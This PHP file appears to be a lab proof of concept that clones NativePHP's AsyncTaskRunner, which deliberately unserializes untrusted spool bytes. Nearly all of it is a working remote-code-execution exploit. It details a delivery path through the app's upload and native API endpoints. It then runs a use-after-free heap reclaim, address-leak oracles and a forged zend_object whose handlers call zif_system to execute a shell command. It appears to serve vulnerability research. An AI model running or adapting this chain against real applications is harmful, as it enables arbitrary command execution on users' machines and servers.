<?php
/**
 * shape9_runner.php — AsyncTaskRunner clone, FULL-IN-BAND zero4 RCE lane.
 *
 * Same shape as runner.php (readPayload → raw unserialize) but the app-side
 * gadget classes carry the whole in-band bootstrap (poc_matrix/pwn_zero4_live
 * ported to bridge delivery): NO gdb, NO baked addresses, NO argv — every
 * address is discovered in-process during the same destruction walk that the
 * UAF lives in, and the only per-build knowledge (zend_empty_array /
 * zif_system offsets, from shape9_elfsyms.py on the bundled binary) rides in
 * the spool bytes as object properties, exactly as a real exploit ships them.
 *
 * Delivery (framework receipt): webview content → POST /upload (app
 * file-save) → POST /_native/api/call File.Copy (raw paths) → spool
 * storage/framework/async/payload/{id}.task → POST /_native/api/call
 * AsyncTask.Dispatch → THIS runner unserializes the attacker bytes raw.
 *
 * Chain inside unserialize(payload):
 *   NativeAsyncRce::__destruct (fires mid-walk via the dup-key release):
 *     M1 dance: re-entrant a:127 array reclaims the freed 8160B var_entries
 *       block2; bucket0.val leak → block2 = $arr[129] - 5056.
 *     M2 VM-slot oracles: u-call temp slots leak &T_u5/&T_u13; strlen oracle
 *       on the string-at-&T_u9 reads *(&T_u9+16) = &zend_empty_array
 *       → base = oracle - OFF_EMPTY (validated: spacing 128, double oracle,
 *       lo12 match, page-aligned).
 *     write /tmp/e (marker cmd — attacker property bytes), unset($arr) so the
 *       walk frees block2 at slot[1], then unserialize(fp) pushes FIRE's dtor
 *       entry at slot[19] — AFTER the dance array's slot[1].
 *   walk continues: slot[1] freed → FIRE::__destruct:
 *     M3 reclaim: str_repeat(pat,4) (8160B single alloc) retakes block2;
 *       R:1020/R:1021 strlen canaries + ELF-magic base check (R:1023);
 *       R:1022 hands userland a ref to a forged zend_object whose handlers
 *       table points at zif_system; var_dump($r1) calls
 *       handlers->get_debug_info(obj) = zif_system(fake execute_data)
 *       → system("sh /tmp/e") → uid marker.
 */

abstract class NativeAsyncStage {
    public string $dp = '';      // dance payload (a:127:{...})
    public string $fp = '';      // FIRE payload (O:15:"NativeAsyncFire":0:{}})
    public string $oe = 'ffe460'; // zend_empty_array offset, hex (elfsyms)
    public string $oz = '523c60'; // zif_system offset, hex (elfsyms)
    public string $ecmd = 'id > /tmp/pwned_nativephp_rce';
}

class NativeAsyncRce extends NativeAsyncStage {
    public static int $OFF_EMPTY = 0;
    public static int $OFF_ZIF = 0;
    public static int $block2 = 0;
    public static int $base = 0;

    public function __destruct() {
        self::$OFF_EMPTY = hexdec($this->oe);
        self::$OFF_ZIF   = hexdec($this->oz);

        $arr = unserialize($this->dp);
        $blk = $arr[129] ?? 5;
        if ($blk === 5 || !is_int($blk) || $blk < 0x10000) {
            echo "DANCE-MISS (attempt skipped)\n"; return;
        }
        $block2 = $blk - 5056;
        echo "M1 block2 = 0x", dechex($block2), "\n";

        $u2 = unserialize('a:0:{}');
        $u3 = unserialize('a:0:{}');
        $u4 = unserialize('a:0:{}');
        $u5 = unserialize('a:0:{}');
        $vm5 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 1) { $vm5 = (int)$v; } }
        if ($vm5 < 0x10000) { echo "LEAK-MISS T_u5\n"; return; }

        $u6 = unserialize('a:0:{}');
        $u7 = unserialize('a:0:{}');
        $u8 = unserialize('a:0:{}');
        $u9 = unserialize('a:0:{}');
        $vs = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 2) { $vs = $v; } }

        $u10 = unserialize('a:0:{}');
        $len_s = strlen($vs);                     // *(&T_u9+16) = &zend_empty_array

        $u11 = unserialize('a:0:{}');
        $u12 = unserialize('a:0:{}');
        $u13 = unserialize('a:0:{}');
        $vm13 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 3) { $vm13 = (int)$v; } }

        $u14 = unserialize('a:0:{}');
        $u15 = unserialize('a:0:{}');
        $u16 = unserialize('a:0:{}');
        $u17 = unserialize('a:0:{}');
        $vs2 = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 4) { $vs2 = $v; } }
        $u18 = unserialize('a:0:{}');
        $len_s2 = strlen($vs2);

        echo "M2 T_u5=0x", dechex($vm5), " T_u13=0x", dechex($vm13),
             " spacing=", ($vm13 - $vm5), "\n";
        echo "M2 ORACLE1=0x", dechex($len_s), " ORACLE2=0x", dechex($len_s2), "\n";

        if ($vm13 - $vm5 !== 128)          { echo "M2-BAIL slot spacing\n"; return; }
        if ($len_s !== $len_s2)            { echo "M2-BAIL oracle mismatch\n"; return; }
        if (($len_s & 0xfff) !== (self::$OFF_EMPTY & 0xfff)) {
            echo "M2-BAIL oracle lo12 (offset table mismatch?)\n"; return;
        }
        $base = $len_s - self::$OFF_EMPTY;
        if (($base & 0xfff) !== 0)         { echo "M2-BAIL base misaligned\n"; return; }

        self::$block2 = $block2;
        self::$base   = $base;
        echo "M2-DONE base=0x", dechex($base),
             " zif_system=0x", dechex($base + self::$OFF_ZIF), "\n";

        // marker command (attacker property bytes) — written BEFORE the free
        file_put_contents('/tmp/e', $this->ecmd . "\n");

        unset($arr);   // leave rc=1 held by dtor slot[1] => walk frees block2

        // Push FIRE's dtor entry AFTER the dance array's slot[1]:
        unserialize($this->fp);
    }
}

class NativeAsyncFire {
    public function __destruct() {
        $block2 = NativeAsyncRce::$block2; $base = NativeAsyncRce::$base;
        if (!$block2 || !$base) { echo "FIRE-BAIL no statics\n"; return; }
        $ZIF = $base + NativeAsyncRce::$OFF_ZIF;

        $V = function ($off) use ($block2) { return $block2 + 24 + $off; };
        $OBJ = $V(128); $HT = $V(600); $CE = $V(1600); $SMINI = $V(224);

        $MAGIC1 = 0x4142434445464748;
        $MAGIC2 = 0x1122334455667788;

        // Layout (pat[x] == block2+24+x == string val[x]; 2040 bytes total):
        //   pat[0..8]   data[1] -> fz1 @32 ; pat[8..16] data[2] -> fz2 @48
        //   pat[16..24] data[3] -> forge zval @64
        //   fz1 {str@80} len@96 = MAGIC1 ; fz2 {str@88} len@104 = MAGIC2
        //   forge {&OBJ, 0x108} @64 ; OBJ @128 ; SMINI @224 ; HT @600 ; CE @1600
        $pat  = pack('P', $V(32));                   // 0..8   data[1] = P1
        $pat .= pack('P', $V(48));                   // 8..16  data[2] = P2
        $pat .= pack('P', $V(64));                   // 16..24 data[3] = P3 (forge zval)
        $pat .= pack('P', $V(112));                  // 24..32 data[4] = P4 (fz3: ELF check)
        $pat .= pack('PVV', $V(80), 6, 0);           // 32..48 fz1: string @80
        $pat .= pack('PVV', $V(88), 6, 0);           // 48..64 fz2: string @88
        $pat .= pack('PVV', $OBJ, 0x108, 0);         // 64..80 forge zval {&OBJ, IS_OBJECT|RC}
        $pat .= str_repeat("\x00", 16);              // 80..96 str1 header (gc,h)
        $pat .= pack('P', $MAGIC1);                  // 96..104 str1.len
        $pat .= pack('P', $MAGIC2);                  // 104..112 str2.len (str2 header @88)
        $pat .= pack('PVV', $base - 16, 6, 0);       // 112..128 fz3: string @BASE-16 (len = *(BASE) = ELF magic)
        // OBJ @128 (also the fake zend_execute_data, rdi):
        $pat .= pack('VV', 1, 0x208);                // +0  gc rc=1, IS_OBJECT|FREE_CALLED
        $pat .= pack('VV', 0, 0);                    // +8  handle, extra_flags
        $pat .= pack('P', $CE);                      // +16 ce -> zeros
        $pat .= pack('P', $HT);                      // +24 handlers -> table
        $pat .= pack('P', 0);                        // +32 properties
        $pat .= pack('P', 0x0000000100000000);       // +40 num_args=1 @+44
        $pat .= str_repeat("\x00", 32);              // +48..80
        $pat .= pack('PVV', $SMINI, 6, 0);           // +80 arg1 = {str, IS_STRING}
        // SMINI @224 (= OBJ+96):
        $pat .= pack('VV', 1, 0x16);                 // gc rc=1, GC_STRING
        $pat .= pack('P', 0);                        // h
        $pat .= pack('P', 9);                        // len = 9
        $pat .= "sh /tmp/e\x00";                     // val
        $pat .= str_repeat("\x00", 600 - 258);       // pad to HT @600
        // HANDLERS @600 (zend_object_handlers, vdR3 layout):
        $pat .= pack('VV', 0, 0);                    // +0 offset + pad
        $pat .= pack('P', 0);                        // +8 free_obj (skipped)
        $pat .= pack('P', $ZIF);                     // +16 dtor_obj = zif_system
        $pat .= str_repeat("\x00", 136 - 24);        // ..get_class_name
        $pat .= pack('P', $ZIF);                     // +136 get_class_name = zif_system
        $pat .= str_repeat("\x00", 160 - 144);       // ..get_debug_info
        $pat .= pack('P', $ZIF);                     // +160 get_debug_info = zif_system
        $pat .= str_repeat("\x00", 208 - 168);       // rest of table
        $pat .= str_repeat("\x00", 1600 - 808);      // CE zeros 808..1600
        $pat .= str_repeat("\x00", 2040 - 1600);     // pad pattern to 2040

        $s = str_repeat($pat, 4);                    // 8160B: 2 pages, reclaims block2
        echo "M3-STR patlen=", strlen($pat), " strlen=", strlen($s),
             " first16=", bin2hex(substr($s, 0, 16)), "\n";
        flush();

        $c1z = unserialize('R:1020;');               // canary 1
        echo "M3-R1020-done\n"; flush();
        $c2z = unserialize('R:1021;');               // canary 2
        echo "M3-R1021-done\n"; flush();
        $c1 = strlen($c1z); $c2 = strlen($c2z);
        if ($c1 !== $MAGIC1 || $c2 !== $MAGIC2) {
            echo "RECLAIM-MISS c1=0x", dechex($c1), " c2=0x", dechex($c2), "\n";
            return;
        }
        echo "M3 string reclaim OK (canaries verified at block2)\n";

        $c3z = unserialize('R:1023;');               // data[4] -> fz3 -> *(BASE) ELF magic
        echo "M3-R1023-done\n"; flush();
        $c3 = strlen($c3z);
        // \x7fELF + ELFCLASS64 + ELFDATA2LSB (top byte = EI_OSABI, build-varying)
        if (($c3 & 0x00FFFFFFFFFFFFFF) !== 0x00010102464c457f) {
            echo "M3-BAIL base ELF-magic mismatch: 0x", dechex($c3),
                 " (offset table wrong for this build — clean bail)\n";
            return;
        }
        echo "M3 BASE verified via ELF magic at BASE+0\n"; flush();

        $r1 = unserialize('R:1022;');                // $r1 = ref -> fake object
        echo "M3 forged: OBJ=0x", dechex($OBJ), " HT=0x", dechex($HT),
             " zif_system=0x", dechex($ZIF), "\n";
        echo "TRIGGER var_dump(\$r1) -> zif_system(fake_execute_data)\n";
        var_dump($r1);                               // THE CALL
        echo "SURVIVED-CALL\n";
    }
}

/* ---- AsyncTaskRunner::runTask shape ---- */
define('LAB_ROOT', __DIR__);
$id = getenv('NATIVEPHP_TASK_ID') ?: ($argv[1] ?? '');

$path = LAB_ROOT . '/storage/framework/async/payload/' . $id . '.task';

if (!is_file($path)) {
    echo "payload missing for $id\n";
    exit(0);
}

$payload = file_get_contents($path);
@unlink($path);
echo "payload_len=" . strlen($payload) . "\n";

try {
    $work = unserialize($payload);          // AsyncTaskRunner.php:55 verbatim semantics
    echo "unserialize returned " . var_export($work !== false, true) . "\n";
    echo "SURVIVED\n";
} catch (Throwable $e) {
    echo "runner caught: " . $e->getMessage() . "\n";
}
